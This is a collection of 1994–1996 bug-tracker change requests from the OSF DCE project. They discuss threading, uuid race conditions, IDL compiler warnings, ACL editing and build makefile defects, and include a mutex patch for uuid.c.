H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : passwd_export
Short Description             : passwd_export does not allow choice of registry
Reported Date                 : 2/9/94
Found in Baseline             : 1.1
Found Date                    : 2/9/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/9/94 public]

The passwd_export command randomly binds to any master or slave registry
in your cell, it would be nice if I had the option to choose which site
I wanted to bind to.



CR Number                     : 9909
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : thr
Subcomponent Name             : src/threads/cma_thdio_4.c
Short Description             : cma_poll() with a timeout of
less than 1000 milliseconds does not pend, burns cpu cycles
Reported Date                 : 2/8/94
Found in Baseline             : 1.0.3
Found Date                    : 2/8/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/threads/cma_thdio_4.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/8/94 public]

 The code for cma_poll() in src/threads/cma_thdio_4.c for an SVR4 system
calls __nr_poll() with an immediate timeout. If this poll fails, the code
checks for a user supplied timeout. If there is one, the routine blocks
the thread waiting for io activity or a timeout. The code used to set
the timeout is the following:

                cma__interval_to_time( timeout / 1000, &timeout_tmp );

                /*
                 * Add timeout (delta) to current (absolute) time to makean
                 * absolute timeout time.
                 */
                cma__get_time (&abs_time);
                cma__add_time (&abs_time, &abs_time, &timeout_tmp);

The process blocks by calling cma__int_timed_wait() within a while loop, 
using &abs_time to set the timeout value.

The problem is this: the variable "timeout" which appears within the call

                cma__interval_to_time( timeout / 1000, &timeout_tmp );

is an integer. If cma_poll() is called with a timeout of less than 1000, then
(timeout / 1000) equals 0, abs_time equals the system time, and the
cma__interval_to_time() does not block. Instead, this call is made
repeatedly in the while loop and the thread (process) takes up as much cpu
time as it can get.

The customer has observed this problem in practice, and has created a test
program which also demonstrates it (see the bug report).

The customer reported the problem for DCE1.0.2 but the same code exists in
DCE1.0.3



CR Number                     : 9905
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : gds
Subcomponent Name             : bld
Short Description             : libNDS.so is created twice
Reported Date                 : 2/8/94
Found in Baseline             : 1.1
Found Date                    : 2/8/94
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/8/94 public]
During build on OSF/1 system, the libNDS.so is removed and created two times,
causing an error, when build tries to overwrite the existing lib.



CR Number                     : 9902
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : dfs_config
Short Description             : need a menu option for configuring an fdb without a file server
Reported Date                 : 2/7/94
Found in Baseline             : 1.1
Found Date                    : 2/7/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/7/94 public]

It would be nice if we could configure an fldb server without
automatically configuring a file server with it.  I would settle
for dfs_config's asking me if I want to configure the file server
after it has configured the fldb under the "Fileset Location Server"
configuration option.

[2/6/96 public]
Would Transarc respond to this? If this is more like an enhancement
or not a bug then please update the OT appropriately. Thanks!



CR Number                     : 9900
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : uuid generation
Short Description             : Potential timing holes in uuid generation.
Reported Date                 : 2/7/94
Found in Baseline             : 1.0.3
Found Date                    : 2/7/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rpc/runtime/uuid.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[2/7/94 public]

Inside uuid.c there are a number of objects declared INTERNAL (i.e.,
static) which could be read/written concurrently by different threads.  One
potential failure mode could be that the same UUID is created more than
once.

[5/18/94 public]

A second problem surrounds uuid creation on the same machine, but spanning
multiple processes.

Multiple processes can experience uuid collisions under the following
circumstances:

- they execute uuid_create() in lockstep, where lockstep is defined as
  being is within the granularity of the system (API-visible) clock, and,

- they hold the same clock_seq value (mod 2^14).  For simplicity, assume
  the system clock is operating monotonically and no adjustment of
  clock_seq is happening.

There are several things we can do about this:

- Nothing.  A argument can be made that this is a highly unlikely event and
  is far outweighed by the higher probability of a serious DCE bugs
  elsewhere.  This scenario is more likely to occur in a multiprocessor
  machine, but is still relatively unlikely.

- Implement a mutex model to protect uuid creation between processes.
  Multiple processes would disambiguate time of day by using the same time
  adjustment model as today.  This exactly conforms to the RPC AES, Section
  A.2.3 Clock Adjustment, which states, "the current adjustment value is
  read and incremented atomically."  Given the two failure modes described
  above, the current implementation does not conform to this atomicity
  requirement.

  [There's a local consensus that likes this model best.]

  [One downfall of this model is that a relatively unsophisticated user
  could cause a denial of service attack simply by monopolizing the uuid
  creation mutex.  The entire machine would fall victim to this attack.]

- Implement a uuid server either as a standalone entity or in the OS.
  [Highly impractical for a gazillion reasons.]

- Incorporate the OS process-id into the uuid.  There is history of this in
  both the security implementation (ref:
  security/server/rsdb/rsdb_misc.c/rsdb_uuid_create()), and also the RPC
  AES, TABLE A-2 UUID Version Field.  The AES does not specify how the OS
  process-id is integrated into a uuid.

[7/25/96 public]

I am adding the diffs we've added to uuid.c to protect multiple threads
from returning duplicate uuids (because of a race condition, this can
happen quite easily.  I can reproduce this error on solaris and aix).

Checked-out CML/delta/mowry-18213-rpc-uuid-should-be-unique, revision 1.2 
Delta: mowry-18213-rpc-uuid-should-be-unique
Change: rpc/runtime/uuid.c from 12.4 to 12.7
*** rpc/runtime/uuid.c
--- 12.7        1996/07/17 13:01:35
***************
*** 2,7 ****
--- 2,22 ----
   * @TRANSARC_COPYRIGHT@
   *
   * $TALog: uuid.c,v $
+  * Revision 12.7  1996/07/17  13:01:35  mowry
+  * There was a race condition in uuid_create that allowed multiple calls to
+  * uuid_create to return the same value.
+  *
+  * Added a mutex to protect static time variables from being accessed by
+  * multiple threads simultaneously in uuid_create.  Also updated logic around
+  * the time_adjust calculation.  This value is used to create a uuid when
+  * successive calls to gettimeofday return the same value (i.e. we're running
+  * faster than the clock is ticking).  The function that calculates the current
+  * time always multiplies the microsecond value by UUID_C_100NS_PER_USEC (10)
+  * before returning.  time_adjust should never be allowed to exceed
+  * UUID_C_100NS_PER_USEC, or we run the risk of using a time value that may
+  * (in the future) be used by another thread.
+  * [from r12.4 by delta mowry-18213-rpc-uuid-should-be-unique, r1.1]
+  *
   * Revision 12.4  1995/06/22  18:57:51  nydick
   * Certain uuid routines are documented to treat NULL as a nil uuid.
   * Instead, they coredump.
***************
*** 22,28 ****
   */
  
  #if !defined(_NOIDENT) && !defined(lint)
! static char *TARCSId = "$Id: c009900,v 1.5 96/07/25 10:28:43 root Exp $";
  #endif
  
  /*
--- 37,43 ----
   */
  
  #if !defined(_NOIDENT) && !defined(lint)
! static char *TARCSId = "$Id: c009900,v 1.5 96/07/25 10:28:43 root Exp $";
  #endif
  
  /*
***************
*** 267,273 ****
  #define TIME_HIGH_MASK              0x0fff0000
  #define TIME_HIGH_SHIFT_COUNT       16
  
! #define MAX_TIME_ADJUST             0x7fff
  
  #define CLOCK_SEQ_LOW_MASK          0xff
  #define CLOCK_SEQ_HIGH_MASK         0x3f00
--- 282,288 ----
  #define TIME_HIGH_MASK              0x0fff0000
  #define TIME_HIGH_SHIFT_COUNT       16
  
! #define MAX_TIME_ADJUST             UUID_C_100NS_PER_USEC
  
  #define CLOCK_SEQ_LOW_MASK          0xff
  #define CLOCK_SEQ_HIGH_MASK         0x3f00
***************
*** 349,354 ****
--- 364,377 ----
   */
  INTERNAL boolean got_address = FALSE;
  
+ /*
+  * mutex and pthread_once data to protect time values calculated in
+  * uuid_create
+  */
+  INTERNAL boolean32       time_mutex_inited = false;
+  INTERNAL pthread_mutex_t time_mutex;
+ 
  /****************************************************************************
   *
   * local function declarations
***************
*** 554,559 ****
--- 577,587 ----
  
      uuid__get_os_time (&time_last);
  
+     if (!time_mutex_inited) {
+       pthread_mutex_init(&time_mutex, pthread_mutexattr_default);
+       time_mutex_inited = true;
+     }
+ 
  #ifdef UUID_NONVOLATILE_CLOCK
      clock_seq = uuid__read_clock();
  #else
***************
*** 631,638 ****
--- 659,674 ----
          return;
      }
  
+     if (pthread_mutex_lock(&time_mutex)) {
+       *status = uuid_s_internal_error;
+       DEBUG_PRINT ("uuid_create", *status);
+       return;
+     }
+ 
      do
      {
+       got_no_time = FALSE;
+ 
          /*
           * get the current time
           */
***************
*** 656,662 ****
                  time_adjust = 0;
                  break;
              case uuid_e_equal_to:
!                 if (time_adjust == MAX_TIME_ADJUST)
                  {
                      /*
                       * spin your wheels while we wait for the clock to tick
--- 692,698 ----
                  time_adjust = 0;
                  break;
              case uuid_e_equal_to:
!                 if (time_adjust >= MAX_TIME_ADJUST)
                  {
                      /*
                       * spin your wheels while we wait for the clock to tick
***************
*** 671,676 ****
--- 707,713 ----
              default:
                  *status = uuid_s_internal_error;
                  DEBUG_PRINT ("uuid_create", *status);
+               pthread_mutex_unlock(&time_mutex);
                  return;
          }
      } while (got_no_time);
***************
*** 701,706 ****
--- 738,749 ----
      uuid->clock_seq_hi_and_reserved |= UUID_RESERVED_BITS;
  
      memcpy (uuid->node, &eaddr, sizeof (uuid_address_t));
+ 
+     if (pthread_mutex_unlock(&time_mutex)) {
+       *status = uuid_s_internal_error;
+       DEBUG_PRINT ("uuid_create", *status);
+       return;
+     }
  
      *status = uuid_s_ok;
      RPC_LOG_UUID_CREATE_XIT;



CR Number                     : 9856
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : 
Short Description             : generated idl code gives compiler warnings on rios
Reported Date                 : 1/28/94
Found in Baseline             : 1.1
Found Date                    : 1/28/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/28/94 public]
I believe this is caused by the rpc code cleanup.  Seems OK on 486 and HP -
just appears on the RIOS..

In the dce/utils/svc directory of the BASIC pass of the build (reformatted
for easy reading):

xlc -c -D_ALL_SOURCE -DAIX32   -I. -I/u1/devobj/sb/nb_rios/src/dce/utils/svc 
	-I/project/dce/build/dce1.1-snap/src/dce/utils/svc
	-I/u1/devobj/sb/nb_rios/export/rios/usr/include
	-I/project/dce/build/dce1.1-snap/export/rios/usr/include
	service_cstub.c
"service_cstub.c", line 598.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 674.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 750.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 828.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 909.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 990.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 1072.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.
"service_cstub.c", line 1150.19: 1506-193 (E) Function call argument cannot be
	assigned to corresponding parameter.

[8/11/94 public]

This error is occurring in the call to rpc_ss_call_end2(), and appears
to be referring to the first argument. 

The facts of the matters:

The prototype for rpc_ss_call_end2 is as follows:

void rpc_ss_call_end2( volatile rpc_call_handle_t * , <others>)

The call is 
	rpc_ss_call_end2( &IDL_ms.IDL_call_h, <otherargs>)

IDL_call_h is defined as follows 

	volatile rpc_call_handle_t IDL_call_h ;

In other include files, we have the following 

typedef rpc_opaque_ptr_t rpc_call_handle_t ;
typedef rpcbase_v0_0_0 * rpc_opaque_ptr_t ;
typedef struct { 
    unsigned32 dummy;
} rpcbase_v0_0_0;

So, one would think that by taking the address of a volatile thing,
you would a pointer compatible with the declaration "volatile thing *".
Maybe not. Note that, in the case of const, the effect of the
following declarations 

typedef char * charptr ;
const charptr cp ;

is to declare cp as a constant-qualified pointer to char 
(see section 6.5.4.1 on the ANSI standard for more info on this).

So ... does the function want a pointer to a volatile
rpc_call_handle_t, or a volatile-qualified pointer to
rpc_call_handle_t? I claim the former (functions called inside
TRY/ENDTRY need to make sure that any data that can be modified 
by other functions is declared volatile. 

In any case, as per discussions with OSF DCE management, re-assigning
to IBM.

[08/13/94 public]
While this is not the right forum to comment on management decisions,
please note that this is NOT an IBM-specific issue; the RIOS compiler
is correctly complaining about "bad" code generated by IDL.
>So, one would think that by taking the address of a volatile thing,
>you would a pointer compatible with the declaration "volatile thing *".
>Maybe not. Note that, in the case of const, the effect of the
Not.  (Didn't we discuss this in a different OT?)
A volatile thing and a volatile pointer to a thing are different.

[8/15/94 public]

Yes, Rich, you are correct: a volatile thing and a volatile pointer to
a thing are different. However, it is certainly the case that taking 
the address of a volatile thing results in a "pointer-to
volatile-qualified thing", and not a "volatile-qualified pointer-to
thing". If you believe differently, try the following test:

volatile int vi ;
volatile int * vip ;
volatile int * volatile vivp;
int * volatile ivp ;

vip = &i ;	//OK
vivp = &i ;	//OK 
ivp = &i ;	// BAD - strips away volatile qualifier 

All 3 compilers (AT396, HP, and RIOS) complain about the line marked
bad.

I believe the issues here are the following: 

1) what is the desired behavior? 

2) does the code (declarations, etc.) provide for that behavior?

3) If so, is the RIOS compiler issuing an incorrect diagnostic( or are
the other compilers failing to generate a diagnostic?)

As to the desired behavior, I believe that we want to make sure that
any reference thru rpc_ss_call_end2()'s first argument is not optimized
away by the compiler. So we know that it's references of the form "*p"
that need to be volatile, and not p itself (since it's value should
never change thruout the execution of the function, and could in fact
be safely declared to be const).

What declaration would guarantee that? We need something like this 

rpc_base_v0_0_0 * volatile * , or 
rpc_call_handle_t volatile * 

which is to say, 

a pointer-to an volatile-qualified pointer-to an rpc_base_v0_0_0

Assuming the volatile behaves like const, one would assume that 
the declaration 

	volatile <pointer_type> x 
would be equivalent to 

	<pointer_type> volatile x 

This is not covered in the ANSI standard, but is consistent for the
description of how const behaves.

However, given our desired behavior, it would appear that the type definition 
in the function prototype is wrong, and should be 

   rpc_ss_call_end_2( rpc_handle_t volatile *, ...)

OK ... I tried that. Both the HP and AT386 compilers loved it. The
RIOS compiler (xlc) issued the same diagnostic. The only code that 
the RIOS compiler accepted was when the typedef was removed and 
replaced with the equivalent structure pointer ; i.e. 

rpc_ss_call_end2( rpcbase_v0_0_0 * volatile *);

struct XXX {
    rpcbase_v0_0_0 * volatile IDL_call_h ;
}

struct XXX foo;

rpc_ss_call_end2( &foo.IDL_call_h, ...) 


Conclusions:

1) the function prototype is incorrect, and should be changed. 

2) the RIOS compiler still issues an incorrect diagnostic (assuming
	const-like behavior of the volatile qualifier)



CR Number                     : 9853
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : sec
Subcomponent Name             : 
Short Description             : acl_edit mask calculation inconsistent for substitute & assign cmds
Reported Date                 : 1/28/94
Found in Baseline             : 1.1
Found Date                    : 1/28/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/28/94 public]

For the acl_edit "substitute" cmd, the mask calculation will occur
and follow POSIX 1003.6 Steps 3, 4, 5, 7, and 8 whether the mask_obj 
entry was specified or not.

For the acl_edit "assign file" cmd, the mask calculation will occur
and follow POSIX 1003.6 Steps 3, 4, and 5. Therefore, the mask is 
NEVER re-calculated whether the mask_obj entry was specified or not.

Since both these commands are similiar, should they follow the SAME
mask calculation method? Refer to CR9842 for the correct mask
calculation method here if accepted.

[7/14/94 public]
Moved to dcecp component for Howard to look at prior to setting status
to defer to 1.2  (dcecp now performs most functions of the control programs)

[7/18/94 public]
This CR either does not affect dcecp or has a related CR open.
It really belongs to acl_edit and should not be changed back to dcecp.

[8/1/94 public]
All control program bugs are being changed to E4 due to the existance
of dcecp.



CR Number                     : 9849
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : sec
Subcomponent Name             : acl_edit
Short Description             : acl_edit should warn when c-bit only on foreign entries
Reported Date                 : 1/28/94
Found in Baseline             : 1.1
Found Date                    : 1/28/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/28/94 public]

I have an intercell configuration with /.../ice_cell.osf.org and
/.../ninja_cell.osf.org.
I created principal, salamone, in /.../ice_cell.osf.org and changed
the default cell information. An erroroneous message was displayed
that stated I was not authorized to perform the change default cell
operation but it did.

>acl_edit /.:/sec/principal/salamone
sec_acl_edit> l
# SEC_ACL for /.:/sec/principal/salamone:
# Default cell = /.../ice_cell.osf.org
unauthenticated:r-------g
user:cell_admin:rcDnfmaug
user:melman:r--------
group:acct-admin:rcDnfmaug
other_obj:r-------g
any_other:r--------

sec_acl_edit> ce /.../ninja_cell.osf.org
sec_acl_edit> l
# SEC_ACL for /.:/sec/principal/salamone:
# Default cell = /.../ninja_cell.osf.org
unauthenticated:r-------g
user:00000064-d05d-2ce7-a000-0000c0239a70:rcDnfmaug
user:00003a9c-3662-2d33-9600-0000c0239a70:r--------
group:00003e80-d087-2ce7-a901-0000c0239a70:rcDnfmaug
other_obj:r-------g
any_other:r--------
sec_acl_edit> co
sec_acl_edit> ex
ERROR: operation on acl not authorized (dce / sec)


>acl_edit /.:/sec/principal/salamone
sec_acl_edit> l

# SEC_ACL for /.:/sec/principal/salamone:
# Default cell = /.../ninja_cell.osf.org
unauthenticated:r-------g
user:00000064-d05d-2ce7-a000-0000c0239a70:rcDnfmaug
user:00003a9c-3662-2d33-9600-0000c0239a70:r--------
group:00003e80-d087-2ce7-a901-0000c0239a70:rcDnfmaug
other_obj:r-------g
any_other:r--------

[1/28/94 public]
Acl_edit did not print an erroneous message.  After the
"cell" command, a "commit" was performed which saved
the acl.  The commit was successful because the user
was presumably logged in as cell_admin (or was in
the group acct_admin, since those were the only 
entries with the 'c' bit).  Now that the acl's 
default cell is /.../ninja_cell.osf.org, the 
only entries with the 'c' bit are a user:UUID
and a group:UUID **in the cell /.../ninja_cell.osf.org**!
Since these uuids aren't registered in the ninja_cell,
these entries are meaningless.  (Note they do *not*
equate to cell_admin @ ninja_cell or acct_admin @ ninja_cell.)
The user has locked herself out of this acl.  Without
creating a principal or group in ninja_cell with the
same uuids of those entities in the ice_cell, there is
no way to modify this acl.

The bottom line is that acl_edit does not have a bug.
Since the "cell" command provides a way of shooting
yourself in the foot (locking you out of the acl),
I suggest the enhancement of printing a warning message
and/or prompt for confirmation during a commit after
a cell command.  Perhaps it would be more appropriate to
print this warning/prompt for *any* acl that contains
the 'c' bit ONLY on foreign entries.
Changing to an enhancement request.



CR Number                     : 9825
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : Sequence numbers can roll over to 0
Reported Date                 : 1/26/94
Found in Baseline             : 1.0.2a
Found Date                    : 1/26/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : 
Transarc Status               : 

[1/26/94 public]
We have had problems when the result of pthread_getunique_np() is
zero.  This routine returns zero when its 16-bit counter overflows.
CMA internally uses the counter value of zero as having a special
meaning (i.e. an invalid object, according to the comments in
cma_attr.c, as well as code that compares these sequence numbers in,
say, cma__validate_default_attr().
 
The simplest fix seems to be to fix the two places that increment this
16-bit counter (cma_sequence.c, routine cma__assign_sequence(), and
cma_mutex.c, routine cma__get_first_mutex()) so that they check
whether they just overflowed to zero, and to increment their counter
(to 1).  Expanding the counter to be a 32-bit number or larger is
probably also a good idea, but the check for zero should still be
there.  (How frequently can an application program create threads??)
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'



CR Number                     : 9817
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 9770
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : serverModTime is obsolete
Reported Date                 : 1/25/94
Found in Baseline             : 1.0.3a
Found Date                    : 1/25/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/25/94 public]
During the course of investigating OT9770, an informal survey
of most (all?) of the DFS heavyweights was conducted and revealed 
that the serverModTime field in xvfs_attr is probably obsolete
(a holdover from AFS) and redundant with the ctime field in
the same structure.  Unfortunately, the lateness in the 1.0.3a
release cycle prevented this from gettin cleaned up when OT9770
was fixed.  This OT is to retain this bit of information and
finish the job in 1.1.



CR Number                     : 9816
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : other
S/W Ref Platform              : other
Component Name                : sec
Subcomponent Name             : security db creation
Short Description             : Must the tgt and ptgt unix IDs be fixed?
Reported Date                 : 1/25/94
Found in Baseline             : 1.0.2
Found Date                    : 1/25/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : rs_reserved.h
Sensitivity                   : public

[1/25/94 public]
  The dce-ptgt and dce-rgy principals are assigned fixed Unix IDs, and
so they cannot always conform to the specified "Low Unix ID" for the
principals.
  The "none" group has the same problem with the Low Unix ID for the
groups.
  I presume that there is a reason for reserving the Unix IDs for these
entries. I'd like to get some discussion on that -- we have a request
from outside that it be changed to allow easier administration
(configuration) of secd .. admins are using the Low Unix ID limits to
set the DCE-specific groups and identities to not collide with their
existing ID assignments. E.g. they set all Low Unix IDs (and that of
their 'cell_admin' equivalent) to values like 24000. then their
passwd importation goes smoothly.
  Could these princs and groups be given dynamic Unix IDs?



CR Number                     : 9788
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : installed .h includes non-installed .h
Reported Date                 : 1/20/94
Found in Baseline             : 1.1
Found Date                    : 1/20/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/20/94 public]
The file cma_defer.h is installed on a system and unconditionally includes
the file cma_cond_defs.h.  However cma_cond_defs.h is NOT installed on a
system.  How will this work for an application developer?  I think either
it doesn't or application developers shouldn't include this file (directly
or indirectly) so it shouldn't be in the install tree.

Also several cma headers that are installed in /usr/include/dce include
cma.h without a dce/ in front of it.  How will this work without forcing an
application developer to use -I/usr/include/dce?  Note that the handling of
finding includes is left open to the compiler by ANSI C.

absolut include/dce$ fgrep -e '#include' cma*.h | fgrep '<cma'
cma_assert.h:#include <cma.h>
cma_assert.h:#include <cma_defs.h>
cma_defer.h:#include <cma.h>
cma_defer.h:#include <cma_defs.h>
cma_defer.h:#include <cma_cond_defs.h>
cma_host.h:#include <cma.h>
cma_kernel.h:#include <cma_defs.h>
cma_kernel.h:#include <cma_defer.h>
cma_queue.h:#include <cma.h>



CR Number                     : 9787
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : 
Short Description             : remove extraneous DATAFILES
Reported Date                 : 1/20/94
Found in Baseline             : 1.1
Found Date                    : 1/20/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/20/94 public]
the src/threads/Makefiles has the following line:

  ILIST		= ${INCLUDES} ${OBJECTS} ${DATAFILES}

and yet $DATAFILES is not set anywhere, it should be removed.



CR Number                     : 9769
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : gda
Short Description             : gdad reads resolv.conf and
looks for "nameserver" line
Reported Date                 : 1/18/94
Found in Baseline             : 1.1
Found Date                    : 1/18/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[1/18/94 public]
gdad does several questionable acts. First, on startup it looks at
/etc/resolv.conf for a "nameserver" line, and will only work if 
this line exists. A correctly configured machine does not need 
to have a "nameserver" line.

The second problem is that it only reads this file on startup, so any
changes made must be followed by a stop and restart of gdad.

gdad should be changed to make a nameservice call through the local
operating system's resolver routines, and let the local OS make the
decisions on who to talk to regarding DNS information.



CR Number                     : 9750
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : IDL compiler
Short Description             : Add "unimplemented" exception and [nocode] support
Reported Date                 : 1/17/94
Found in Baseline             : 1.1
Found Date                    : 1/17/94
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/17/94 public]
When developing a DCE it is useful to be able to run the server even
though all the operations might not have been implemented yet.  After
some initial discussion, we believe the following would be very useful:
    1.  A defined public exception that means "operation was recieved but
	is not yet implemented."  This would be mapped to a new fault
	code.  Servers and clients could send/recieve this exception to
	indicate "yes, you're doing the right thing but I'm not finished
	coding yet." :-)  An exception is needed so that the runtime doesn't
	try to marshall return data.
    2.  The [nocode] attribute in a server stub will be given the meaning
	"send the exception defined above."



CR Number                     : 9748
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : common makefiles
Short Description             : EXPDIR defaults to IDIR in
certain situations
Reported Date                 : 1/14/94
Found in Baseline             : 1.1
Found Date                    : 1/14/94
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : lbe/mk/osf.std.mk
Sensitivity                   : public

[1/14/94 public]
If EXPDIR has not been specified in a makefile and IDIR has not been
specified the EXPDIR defaults to _MISSING_EXPDIR_

If EXPDIR has not been specified but IDIR has, then EXPDIR defaults to the
value of IDIR.  This is bad -- it is a completely unwarrented assumption
that header files (or IDL files) export to the same directory in which they
are installed.  This is especially true for DCE -- header files are
installed in /share/include/dce/ whereas they are exported to
/usr/include/dce/

I think EXPDIR should default to _MISSING_EXPDIR_ in cases where it has not
been specified in a makefile.  This facilities the finding of makefile
defects.

[1/22/94 public]
 Assigned this one to Mario Moreira. He has been working on getting the
common makefiles cleaned up.

[7/1/94 public]
Assigned to Annie

[7/13/94 public ]
Reassigned to Marty - Please let me know if you are too busy with Motif.
Thanks Marty.

[7/13/94 public]
If all your really after is weeding out Makefiles that dont have EXPDIR
defined then I can easily have it default _MISSING_EXPDIR_ and add the code

.if ${_EXPDIR_} == "_MISSING_EXPDIR_"
_DO_EXPLINKS_=\
        (echo "*** Makefile Error in export pass.";\
         echo "*** The target ${_EXPORT_TARGET} could not be exported." \
         echo "*** Please define the variable EXPDIR in the subsystem Makefile.") 
.else
_DO_EXPLINKS_=\
        (cd ${EXPORTBASE}${_EXPDIR_:H};\
         ${RM} ${_RMFLAGS_} ${_EXPLINKS_}\
         ${_EXPLINKS_:@.LINK.@; ${LN} ${_EXPORT_TARGET} ${.LINK.}@})
.endif

This would be a lot less cryptic.
----

Comments???!!!

[7/13/94 public]
This sounds really nice.  If I read the above correctly the msg is
displayed whenever EXPDIR is not set regardless of whether IDIR is set.
This should be the behavior.

[7/13/94 public]
Marty, that's exactly what I was looking for.

How about using only one line for the error message, with a unique key for
which you can grep.  For example:

MAKEFILE_ERROR: target ${_EXPORT_TARGET} could not be exported.

[7/13/94 public]
Come to think of it, if you provide the error message for exporting, can
you go and change the code for installing, too?  Right now, stuff will be
installed in _MISSING_IDIR by default.

[7/13/94 public]


